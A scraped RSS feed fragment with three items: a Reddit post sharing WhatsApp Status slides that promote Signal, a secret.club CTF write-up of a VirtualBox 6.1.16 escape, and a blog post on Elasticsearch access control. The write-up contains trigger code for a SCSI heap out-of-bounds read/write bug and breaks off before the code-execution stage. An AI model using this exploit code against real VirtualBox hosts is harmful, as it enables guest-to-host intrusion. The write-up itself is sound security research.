<p><strong>Before sharing your new WhatsApp Status check if the Signal service is currently up and running:</strong> <a href="https://status.signal.org/">status.signal.org</a> (if it is down you should wait, as your contacts may not be able to register!)</p>



<p>​</p>

<p><strong>Thanks to all translators!</strong></p>

<table><thead>
<tr>
<th></th>
<th><strong>GDPR (for EU citizens)</strong></th>
<th><strong>No GDPR (rest of world)</strong></th>
</tr>
</thead><tbody>
<tr>
<td><strong>English</strong></td>
<td><a href="http://imgbox.com/g/wWfXnKIv9T">images</a> - <a href="https://filehorst.de/d/dsIzayIF">zip file</a></td>
<td><a href="https://imgbox.com/g/bu1G1Nnz8s">images</a> - <a href="https://filehorst.de/d/dxvCmdfH">zip file</a></td>
</tr>
<tr>
<td><strong>German</strong></td>
<td><a href="https://imgbox.com/g/6cGzvJ7JbQ">images</a> - <a href="https://filehorst.de/d/dtaAcwlv">zip file</a></td>
<td><a href="https://imgbox.com/g/KbIM7RBmAb">images</a> - <a href="https://filehorst.de/d/dtwhadvs">zip file</a></td>
</tr>
<tr>
<td><strong>Dutch</strong></td>
<td><a href="http://imgbox.com/g/KZzkrjNlRF">images</a> - <a href="https://filehorst.de/d/dhiGelei">zip file</a></td>
<td><a href="http://imgbox.com/g/no5XE3rLKf">images</a> - <a href="https://filehorst.de/d/dlHoIBJt">zip file</a></td>
</tr>
<tr>
<td><strong>Spanish</strong></td>
<td><a href="http://imgbox.com/g/jDX4co55Vc">images</a> - <a href="https://filehorst.de/d/dcjeAeEt">zip file</a></td>
<td><a href="http://imgbox.com/g/Pc0EkJ9qWh">images</a> - <a href="https://filehorst.de/d/dniedoph">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (PT)</strong></td>
<td><a href="http://imgbox.com/g/2MHxmi4VFS">images</a> - <a href="https://filehorst.de/d/dCprbnrk">zip file</a></td>
<td><a href="http://imgbox.com/g/DaPhzju7Ht">images</a> - <a href="https://filehorst.de/d/dbAHawjy">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (BR)</strong></td>
<td><a href="http://imgbox.com/g/Qj5taiuaL4">images</a> - <a href="https://filehorst.de/d/dIikBxhn">zip file</a></td>
<td><a href="http://imgbox.com/g/9WBMHYKcwA">images</a> - <a href="https://filehorst.de/d/dfxHgAay">zip file</a></td>
</tr>
<tr>
<td><strong>French</strong></td>
<td><a href="http://imgbox.com/g/5Po0sskqve">images</a> - <a href="https://filehorst.de/d/dAmaJgmw">zip file</a></td>
<td><a href="https://imgbox.com/g/hOwDOt4ORM">images</a> - <a href="https://filehorst.de/d/dkiwkiJw">zip file</a></td>
</tr>
<tr>
<td><strong>Czech</strong></td>
<td><a href="http://imgbox.com/g/BPWPrHxNCA">images</a> - <a href="https://filehorst.de/d/dgEajusf">zip file</a></td>
<td><a href="http://imgbox.com/g/7ThzK6HMyH">images</a> - <a href="https://filehorst.de/d/dinpsFvk">zip file</a></td>
</tr>
<tr>
<td><strong>Italian</strong></td>
<td><a href="http://imgbox.com/g/gT3KmJN3z7">images</a> - <a href="https://filehorst.de/d/dBIfvBvp">zip file</a></td>
<td><a href="http://imgbox.com/g/FT9Z1ROxFO">images</a> - <a href="https://filehorst.de/d/dIdfJagg">zip file</a></td>
</tr>
<tr>
<td><strong>Hindi</strong></td>
<td>please send translation for GDPR part (slide 12)</td>
<td><a href="http://imgbox.com/g/kJg7fHBEjK">images</a> - <a href="https://filehorst.de/d/drszqqzj">zip file</a></td>
</tr>
<tr>
<td><strong>Turkish</strong></td>
<td><a href="http://imgbox.com/g/U3rN7N2pUO">images</a> - <a href="https://filehorst.de/d/dnmqvpEx">zip file</a></td>
<td><a href="http://imgbox.com/g/60YM7Y9K8Q">images</a> - <a href="https://filehorst.de/d/dcyjAfcb">zip file</a></td>
</tr>
<tr>
<td><strong>Polish</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Arabic</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Cantonese</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Finnish</strong></td>
<td><a href="http://imgbox.com/g/7XuhMwwKNU">images</a> - <a href="https://filehorst.de/d/dwymzjaJ">zip file</a></td>
<td><a href="http://imgbox.com/g/yAM6M5vklE">images</a> - <a href="https://filehorst.de/d/dhzrICHj">zip file</a></td>
</tr>
<tr>
<td><strong>Slovak</strong></td>
<td><a href="http://imgbox.com/g/UhzDU5wtuB">images</a> - <a href="https://filehorst.de/d/ddrHhsqh">zip file</a></td>
<td><a href="http://imgbox.com/g/iMIU4IPQJd">images</a> - <a href="https://filehorst.de/d/dweGmCEB">zip file</a></td>
</tr>
</tbody></table>

<p><strong>How to contribute</strong></p>

<p><em>Coming soon</em> means you don't have to send me translations for this language anymore, I just need to add them. Please be patient.</p>

<p>If you like to have the status in your language too: <a href="https://pastebin.com/Fc9Xcadi">here is the raw text</a> (try to not change the formatting please). Please translate only into languages you are fluent in.</p>

<p>!Please also provide a screenshot of the "New privacy policy" message  in your language for the 2nd slide. Search the web if needed!</p>



<p>Please look into related subreddits to get familiar with the topic:</p>

<ul>
<li><a href="https://teddit.net/r/signal">r/signal</a></li>
<li><a href="https://teddit.net/r/whatsapp">r/whatsapp</a></li>
<li><a href="https://teddit.net/r/privacy">r/privacy</a></li>
<li><a href="https://teddit.net/r/privacytoolsIO">r/privacytoolsIO</a></li>
</ul>

<p><strong>How to add WhatsApp Status in the correct order</strong></p>

<ol>
<li>First, take a look in your WhatsApp Status privacy settings and make sure to select all the contacts you want to see your new status.</li>
<li>Open the gallery app.</li>
<li>Select all images, starting from the first slide (1-19).</li>
<li>Press share.</li>
<li>Select WhatsApp.</li>
<li>Select "My Status" &amp; make sure the slides are in the correct order.</li>
<li>Add your custom intro text on slide 01.</li>
<li>Send. Done.</li>
</ol>

<p><strong>Best practices</strong></p>

<p>Think about what time is best to post your status. Think about what your contacts are probably doing at the moment. They might not want to read 20 slides of text while they are at work.</p>

<p>At last position in your story I recommend the video from <a href="https://teddit.net/r/signal/comments/kv54u7/best_signal_video_for_your_whatsapp_status/">this post</a> (credits to <a href="https://teddit.net/u/carlosfx">u/carlosfx</a> !).</p>

<p>Signal published a <a href="https://twitter.com/signalapp/status/1349236175773462532">replacement for your profile pic</a> on their twitter account.</p>

<p><a href="https://teddit.net/u/Xath0n">u/Xath0n</a> suggested to put a text status with a direct link to <a href="https://signal.org/downloads">signal.org/downloads</a> at the end, so people don't need to search for it (Signal is in the top charts in the app stores currently, so it shouldn't be too hard to find anyway).</p>

<p>You can also thank everyone for watching your TED talk, lol.</p>

<p>If you think most of your contacts don't look into WhatsApp Status you can do the following:</p>

<ul>
<li>let them know that you want them to look into your WA Status, because it's important to you</li>
<li>send the slides to your contacts directly or in a group chat</li>
<li>send them the link to the images (note that the mobile view of imgbox is not the best)</li>
</ul>



<ul>
<li>I know that 19+ slides are a lot for a single WhatsApp Status and people might not read it <strong>but it is worth a try.</strong></li>
<li>It is intentionally written in simple terms to be understood by people who are not as tech savvy as you are.</li>
<li>Be prepared for questions, arguments, debates and to provide evidence of what your new status is saying (look up this subreddit for more info). Make sure you know the facts!</li>
<li>The style of the content may not appeal to everyone in your contact list.</li>
<li>Remember that some of your contacts don't look at WA Status at all.</li>
</ul>



<p><strong>Animated Status</strong> (old date)</p>

<p><a href="https://teddit.net/user/JordyEGNL/">u/JordyEGNL</a> submitted an animated version of the EN (for EU citizens) status: <a href="https://teddit.net/r/signal/comments/kx4msl/i_transformed_the_pictures_of_ucrazylizards_post/">check it out</a> !</p>

<p><a href="https://teddit.net/u/candiesdoodle">u/candiesdoodle</a> submitted an animated version of the EN (outside EU) status: <a href="https://filehorst.de/download_mobile.php?file=dxaFzAvF">check it out</a> !</p>

<p><strong>Blank first slide</strong></p>

<p>Some of you asked if I can post the first slide with no text. <a href="https://imgbox.com/g/0FtNwMdC8P">Here it is</a>. Have fun.</p>



<p>The images linked above are published under the <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0 Universal (CC0 1.0) Public Domain Dedication</a>. Do whatever you want. No attribution required. Happy sharing!</p>

<p>​</p>

<p>Edit: Removed a weak argument on slide 19 about Telegram. Danke <a href="https://teddit.net/u/A2DreppiD">u/A2DreppiD</a> !</p>

<p>Edit2: Thanks for my first award ever <a href="https://teddit.net/u/TravellingTARDIS">u/TravellingTARDIS</a> !</p>

<p>Edit3: TIL Reddit for iPad messes up my markdown. Sry for that.</p>

<p>Edit4: <strong>THANK YOU ALL FOR THE AWARDS!</strong> Really appreciate it! I'm overwhelmed by the positive feedback and happy to hear that it helped a lot of you. Also: RIP inbox. Sry if I can't reply to all of your comments!</p>

<p>Edit5: there was a line missing in my pastebin for slide 03, thx <a href="https://teddit.net/u/TovaX">u/TovaX</a></p>

<p>Edit6: Added a how-to because many of you asked how to add multiple images to your status!</p>

<p>Edit7: Linked to Signal status page. New animated EN (outside EU) version!</p>
</div><!-- SC_ON --></div></div>]]>
            </description>
            <link>https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796535</guid>
            <pubDate>Fri, 15 Jan 2021 21:10:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping VirtualBox 6.1: Part 1]]>
            </title>
            <description>
<![CDATA[
Score 313 | Comments 44 (<a href="https://news.ycombinator.com/item?id=25795731">thread link</a>) | @lima
<br/>
January 15, 2021 | https://secret.club/2021/01/14/vbox-escape.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/14/vbox-escape.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team <a href="https://twitter.com/Sauercl0ud">Sauercl0ud</a> as part of the <a href="https://realworldctf.com/">RealWorld CTF 2020/2021</a>.</p><p>The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn’t exploitable on default configurations of VirtualBox so the impact is very limited.</p><p>Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, <a href="https://twitter.com/M4x_1997">M4x</a> for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all <a href="#credits">the people involved</a> in writing the exploit.</p><p>Let’s get to some pwning :D</p><h2 id="discovering-the-vulnerability"> <a href="#discovering-the-vulnerability">Discovering the Vulnerability</a></h2><p>The challenge description already hints at where a bug might be:</p><blockquote><p>Goal:</p><p>Please escape VirtualBox and spawn a calc(“C:\Windows\System32\calc.exe”) on the host operating system.</p><p>You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc.</p><p>But you can’t do anything in the host, including modifying the guest configuration file, etc.</p><p><strong>Hint: SCSI controller is enabled and marked as bootable.</strong></p><p>Environment:</p><p>In order to ensure a clean environment, we use virtual machine nesting to build the environment. The details are as follows:</p><ul><li>VirtualBox:6.1.16-140961-Win_x64.</li><li>Host: Windows10_20H2_x64 Virtual machine in Vmware_16.1.0_x64.</li><li>Guest: Windows7_sp1_x64 Virtual machine in VirtualBox_6.1.16_x64.</li></ul></blockquote><p>The only special thing about the VM is that the <code>SCSI</code> driver is loaded and marked bootable so that’s the place for us to start looking for vulnerabilities.</p><p>Here are the operations the <code>SCSI</code> device supports:</p><pre><code><span>// /src/VBox/Devices/Storage/DevBusLogic.cpp</span>
    
    <span>// [...]</span>

    <span>if</span> (fBootable)
    {
        <span>/* Register I/O port space for BIOS access. */</span>
        rc <span>=</span> PDMDevHlpIoPortCreateExAndMap(pDevIns, BUSLOGIC_BIOS_IO_PORT, <span>4</span> <span>/*cPorts*/</span>, <span>0</span> <span>/*fFlags*/</span>,
                                           buslogicR3BiosIoPortWrite,       <span>// Write a byte</span>
                                           buslogicR3BiosIoPortRead,        <span>// Read a byte</span>
                                           buslogicR3BiosIoPortWriteStr,    <span>// Write a string</span>
                                           buslogicR3BiosIoPortReadStr,     <span>// Read a string</span>
                                           <span>NULL</span> <span>/*pvUser*/</span>,
                                           <span>"BusLogic BIOS"</span> , <span>NULL</span> <span>/*paExtDesc*/</span>, <span>&amp;</span>pThis<span>-&gt;</span>hIoPortsBios);
        <span>// [...]</span>
    }
    <span>// [...]</span>
</code></pre><p>The <code>SCSI</code> device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced.</p><p>While auditing the <code>vboxscsiReadString</code> function, <a href="https://twitter.com/_tsuro">tsuro</a> and <a href="https://twitter.com/__spq__">spq</a> found something interesting:</p><pre><code><span>// src/VBox/Devices/Storage/VBoxSCSI.cpp</span>

<span>/**
 * @retval VINF_SUCCESS
 */</span>
<span>int</span> vboxscsiReadString(PPDMDEVINS pDevIns, PVBOXSCSI pVBoxSCSI, <span>uint8_t</span> iRegister,
                       <span>uint8_t</span> <span>*</span>pbDst, <span>uint32_t</span> <span>*</span>pcTransfers, <span>unsigned</span> cb)
{
    RT_NOREF(pDevIns);
    LogFlowFunc((<span>"pDevIns=%#p pVBoxSCSI=%#p iRegister=%d cTransfers=%u cb=%u</span><span>\n</span><span>"</span>,
                 pDevIns, pVBoxSCSI, iRegister, <span>*</span>pcTransfers, cb));

    <span>/*
     * Check preconditions, fall back to non-string I/O handler.
     */</span>
    Assert(<span>*</span>pcTransfers <span>&gt;</span> <span>0</span>);

    <span>/* Read string only valid for data in register. */</span>
    AssertMsgReturn(iRegister <span>==</span> <span>1</span>, (<span>"Hey! Only register 1 can be read from with string!</span><span>\n</span><span>"</span>), VINF_SUCCESS);

    <span>/* Accesses without a valid buffer will be ignored. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>pbBuf, VINF_SUCCESS);

    <span>/* Check state. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>enmState <span>==</span> VBOXSCSISTATE_COMMAND_READY, VINF_SUCCESS);
    Assert(<span>!</span>pVBoxSCSI<span>-&gt;</span>fBusy);

    RTCritSectEnter(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);
    <span>/*
     * Also ignore attempts to read more data than is available.
     */</span>
    <span>uint32_t</span> cbTransfer <span>=</span> <span>*</span>pcTransfers <span>*</span> cb;
    <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>&gt;</span> <span>0</span>)
    {
        Assert(cbTransfer <span>&lt;=</span> pVBoxSCSI<span>-&gt;</span>cbBuf);     <span>// --- [1] ---</span>
        <span>if</span> (cbTransfer <span>&gt;</span> pVBoxSCSI<span>-&gt;</span>cbBuf)
        {
            memset(pbDst <span>+</span> pVBoxSCSI<span>-&gt;</span>cbBuf, <span>0xff</span>, cbTransfer <span>-</span> pVBoxSCSI<span>-&gt;</span>cbBuf);
            cbTransfer <span>=</span> pVBoxSCSI<span>-&gt;</span>cbBuf;  <span>/* Ignore excess data (not supposed to happen). */</span>
        }

        <span>/* Copy the data and adance the buffer position. */</span>
        memcpy(pbDst, 
               pVBoxSCSI<span>-&gt;</span>pbBuf <span>+</span> pVBoxSCSI<span>-&gt;</span>iBuf,  <span>// --- [2] ---</span>
               cbTransfer);

        <span>/* Advance current buffer position. */</span>
        pVBoxSCSI<span>-&gt;</span>iBuf      <span>+=</span> cbTransfer;
        pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>-=</span> cbTransfer;         <span>// --- [3] ---</span>

        <span>/* When the guest reads the last byte from the data in buffer, clear
           everything and reset command buffer. */</span>

        <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>==</span> <span>0</span>)              <span>// --- [4] ---</span>
            vboxscsiReset(pVBoxSCSI, <span>false</span> <span>/*fEverything*/</span>);
    }
    <span>else</span>
    {
        AssertFailed();
        memset(pbDst, <span>0</span>, cbTransfer);
    }
    <span>*</span>pcTransfers <span>=</span> <span>0</span>;
    RTCritSectLeave(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);

    <span>return</span> VINF_SUCCESS;
}
</code></pre><p>We can fully control <code>cbTransfer</code> in this function. The function initially makes sure that we’re not trying to read more than the buffer size <code>[1]</code>. Then, it copies <code>cbTransfer</code> bytes from the global buffer into another buffer <code>[2]</code>, which will be sent to the guest driver. Finally, <code>cbTransfer</code> bytes get subtracted from the remaining size of the buffer <code>[3]</code> and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.</p><p>So much for the logic, but what’s the issue here? There is a check at <code>[1]</code> that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer <strong>has left</strong>. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in <code>[1]</code> won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in <code>[3]</code> to underflow and <code>cbBufLeft</code> will be set to <code>UINT32_MAX-1</code>. This same <code>cbBufLeft</code> will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer.</p><h2 id="getting-oob-readwrite"> <a href="#getting-oob-readwrite">Getting OOB read/write</a></h2><p>We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. <a href="https://twitter.com/fktio">malle</a> got to building VirtualBox from source in order for us to have symbols and a debuggable process while <a href="https://twitter.com/0x4d5aC">0x4d5a</a> came up with the idea of using the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a> driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code.</p><p>Here’s how we triggered the bug:</p><pre><code><span>void</span> exploit() {
    <span>static</span> <span>const</span> <span>uint8_t</span> cdb[<span>1</span>] <span>=</span> {<span>0</span>};
    <span>static</span> <span>const</span> <span>short</span> port <span>=</span> <span>0x434</span>;
    <span>static</span> <span>const</span> <span>uint32_t</span> buffer_size <span>=</span> <span>1024</span>;

    <span>// reset the state machine</span>
    __outbyte(port<span>+</span><span>3</span>, <span>0</span>);

    <span>// initiate a write operation</span>
    __outbyte(port<span>+</span><span>0</span>, <span>0</span>); <span>// TargetDevice (0)</span>
    __outbyte(port<span>+</span><span>0</span>, <span>1</span>); <span>// direction (to device)</span>
    
    __outbyte(port<span>+</span><span>0</span>, ((buffer_size <span>&gt;&gt;</span> <span>12</span>) <span>&amp;</span> <span>0xf0</span>) <span>|</span> (<span>sizeof</span>(cdb) <span>&amp;</span> <span>0xf</span>)); <span>// buffer length hi &amp; cdb length</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size);                                        <span>// bugger length low</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size <span>&gt;&gt;</span> <span>8</span>);                                   <span>// buffer length mid</span>
    
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(cdb); i<span>++</span>)
        __outbyte(port<span>+</span><span>0</span>, cdb[i]);


    <span>// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8</span>
    <span>char</span> buf[buffer_size];
    __inbytestring(port<span>+</span><span>1</span>, buf, buffer_size <span>-</span> <span>1</span>)    <span>// Read bufsize-1</span>
    __inbytestring(port<span>+</span><span>1</span>, buf, <span>9</span>)                  <span>// Read 9 more bytes</span>

    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(buf); i <span>+=</span> <span>4</span>)
        <span>*</span>((<span>uint32_t</span><span>*</span>)(<span>&amp;</span>buf[i])) <span>=</span> <span>0xdeadbeef</span>
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>10000</span>; i<span>++</span>)
        __outbytestring(port<span>+</span><span>1</span>, buf, <span>sizeof</span>(buf))
}

</code></pre><p>The driver first has to initiate the <code>SCSI</code> state machine with a <code>bufsize</code>. Then we read <code>bufsize-1</code> bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated <code>buffer+8</code> with <code>0xdeadbeef</code>.</p><p>After loading this driver in the win7 guest, this is what we get: <img src="https://secret.club/assets/sauercl0ud/VM-aborted.png" alt=""></p><p>As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this <code>Req</code> struct via an <code>IOCTL</code>:</p><pre><code><span>enum</span> operations {
    OPERATION_OUTBYTE <span>=</span> <span>0</span>,
    OPERATION_INBYTE <span>=</span> <span>1</span>,
    OPERATION_OUTSTR <span>=</span> <span>2</span>,
    OPERATION_INSTR <span>=</span> <span>3</span>,
};

<span>typedef</span> <span>struct</span> {
    <span>volatile</span> <span>unsigned</span> <span>int</span> port;
    <span>volatile</span> <span>unsigned</span> <span>int</span> operation;
    <span>volatile</span> <span>unsigned</span> <span>int</span> data_byte_out;
} Req;
</code></pre><p>This enables us to use the driver as a bridge to communicate with the <code>SCSI</code> device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).</p><p>The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use!</p><h2 id="leaking-vboxcdll-and-heap-addresses"> <a href="#leaking-vboxcdll-and-heap-addresses">Leaking <code>vboxc.dll</code> and heap addresses</a></h2><p>We’re able to dump heap data using our OOB read but we’re still far from code execution. This is a good point to start …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://secret.club/2021/01/14/vbox-escape.html">https://secret.club/2021/01/14/vbox-escape.html</a></em></p>]]>
            </description>
            <link>https://secret.club/2021/01/14/vbox-escape.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25795731</guid>
            <pubDate>Fri, 15 Jan 2021 20:13:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch is dead, long live Open Distro for Elasticsearch]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 58 (<a href="https://news.ycombinator.com/item?id=25794987">thread link</a>) | @nathaliaariza
<br/>
January 15, 2021 | https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR<strong>: </strong>The need for an open-source alternative to Elasticsearch has recently become more evident; platforms that bundle Open Distro for Elasticsearch are able to future-proof open-source support for free-text search and Elasticsearch. In this post, we describe how Hopsworks leverages the authentication and authorization support in Open Distro for Elasticsearch to make free text search a project-based multi-tenant service in Hopsworks. More concretely, Hopsworks now supports dynamic <a href="https://en.wikipedia.org/wiki/Role-based_access_control#:~:text=Role%2Dbased%20access%20control%20(RBAC)%20is%20a%20policy%2D,simple%20to%20perform%20user%20assignments.">role-based access control</a> (RBAC) to indexes in elasticsearch with no performance penalty by building on Open Distro for Elasticsearch (ODES).<br></p><p>In January 2021, <a href="https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">Elastic switched from the Apache V2 open-source license</a> for both Elasticsearch and Kibana to a non open-source license to Server Side Public License (SSPL).</p><p>Hopsworks is an open-source platform that includes Open Distro for Elasticsearch (a fork of Elasticsearch) and Kibana.</p><p>In Hopsworks, we use Elasticsearch to provide free-text search for AI assets (features, models, experiments, datasets, etc). We also make Elasticsearch indexes available for use by programs run in Hopsworks. As we interpret it, the latter functionality means we contravene the licensing terms of the SSPL:</p><blockquote>“If you make the functionality of the Program or a modified version available to third parties as a service... (license conditions apply)”</blockquote><p>‍</p><p>Luckily, we recently made the switch from Elasticsearch to <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a>, supported by AWS, which is Apache v2 licensed.<br></p><p>Open Distro for Elasticsearch supports Active Directory and LDAP for authentication and authorization. <a href="https://opendistro.github.io/for-elasticsearch-docs/old/0.9.0/docs/security/permissions/">Using the Security plugin</a>, you can use RBAC to control the actions a user can perform. A role defines the cluster operations and index operations a user can perform, including access to indices, and even fine-grained field and document level access. RBAC allows an administrator to define a single security policy and apply it to all members of a department. But individuals may be members of multiple departments, so a user might be given multiple roles. <a href="https://link.springer.com/chapter/10.1007/978-3-540-85776-1_17">With dynamic role-based access control</a> you can change the set of roles a user can hold at a given time. </p><p>For example, if a user is a member of two departments - one for accessing banking data and another one for accessing trading data, with dynamic RBAC, you could restrict the user to only allow her to hold one of those roles at a given time. The policy for deciding which role the user holds could, for example, depend on what VPN (virtual private network) the user is logged in to or what building the user is present in. In effect, dynamic roles would allow the user to hold only one of the roles at a time and sandbox her inside one of the domains - banking or trading. It would prevent her from cross-linking or copying data between the different trading and banking domains.</p><p>Hopsworks implements a dynamic role-based access control model through its project-based multi-tenant security model<strong>. </strong>&nbsp;Every Project has an <strong>owner</strong> with full read-write privileges and zero or more <strong>members</strong>.&nbsp; A project owner may invite other users to his/her project as either a <strong>Data Scientist </strong>(read-only privileges and run jobs privileges) or <strong>Data Owner</strong> (full privileges). Users can be members of (or own) multiple Projects, but inside each project, each member (user) has a unique identity - we call it a <em>project-user identity</em>.&nbsp; For example, user <em>Alice</em> in <em>Project A</em> is different from user <em>Alice </em>in <em>Project B - </em>(in fact, the system-wide (project-user) identities are <strong><em>ProjectA__Alice</em></strong> and <strong><em>ProjectB__Alice</em></strong>, respectively)<em>. </em></p><p><em>‍</em>As such, each project-user identity is effectively a role with the project-level privileges to access data and run programs inside that project. If a user is a member of multiple projects, she has, in effect, multiple possible roles, but only one role can be active at a time when performing an action inside Hopsworks. When a user performs an action (for example, runs a program) it will be executed with the project-user identity. That is, the action will only have the privileges associated with that project. The figure below illustrates how Alice has a different identity for each of the two projects (A and B) that she is a member of. Each project contains its own separate private assets. Alice can use only one identity at a time which guarantees that she can’t access assets from both projects at the same time.</p><p>Hopsworks enables you to host sensitive data in a shared cluster using a <a href="https://www.logicalclocks.com/blog/how-we-secure-your-data-with-hopsworks">project-based access control security model</a> (an implementation of dynamic role-based access control). In Hopsworks, a project is a secure sandbox with members, data, code, and services. Similar to GitHub repositories, projects are self-service: users manage membership, roles, and can securely share data assets with other projects. This <em>project-based multi-tenant security model</em> enables users to host both sensitive and shared data in a single Hopsworks cluster - you do not need to manage and pay for separate clusters.&nbsp;<br></p><figure id="w-node-14452fea4591-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bafe67f9a01f3d5100b3_Screenshot%202021-01-15%20at%2016.54.57.png" loading="lazy" alt=""></p></figure><p>‍</p><p>An important aspect of project-based multi-tenancy is that assets can be shared between projects - sharing does not mean that data is duplicated. The current assets that can be shared between projects are: files/directories in HopsFS, Hive databases, feature stores, and Kafka topics. For example, in the figure below there are three users (User1, User2, and User3)&nbsp; and two projects (A and B). User1 is a member of project A, while User2 and User3 are members of project B. All three users (User1, User2, User3) can access the assets shared between project A and project B. As sharing does not mean copying, the access control rules for the asset are updated to give users in the other project read or write permissions on the shared asset.</p><p>‍<br></p><figure id="w-node-213ef0acf495-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb182dbe7b79013d5093_Screenshot%202021-01-15%20at%2016.55.17.png" loading="lazy" alt=""></p></figure><p>‍</p><p>P<em>roject-user identity</em> is primarily based on a X.509 certificate issued internally by Hopsworks. Access control policies, however, are implemented by the platform services (HopsFS, Hive, Feature Store, Kafka), and for Elasticsearch Open Distro, permissions are managed using an open-source <a href="https://github.com/logicalclocks/elasticsearch-chef">Hopsworks project-based authorizer plugin</a>.</p><p>The following PySpark code snippet, <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-python.ipynb">available as a notebook</a> when you run the Spark Tour on Hopsworks, shows how to read from an index that is private to a project from PySpark. There is also an <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-scala.ipynb">equivalent Scala/Spark notebook</a>.</p><p>
    -- CODE language-bash --
from hops import elasticsearch, hdfs 
df = spark.read.option("header","true").csv("hdfs:///Projects/" + hdfs.project_name() + "/Resources/akc_breed_info.csv")

# Write df to the project's private index called 'newindex'
df.write.format('org.elasticsearch.spark.sql').options(**elasticsearch.get_elasticsearch_config("newindex")).mode("Overwrite").save()

# Read from the project's private index called 'newindex'
reader = spark.read.format("org.elasticsearch.spark.sql").options(**elasticsearch.get_elasticsearch_config("newindex"))
df = reader.load().orderBy("breed")
df.show()
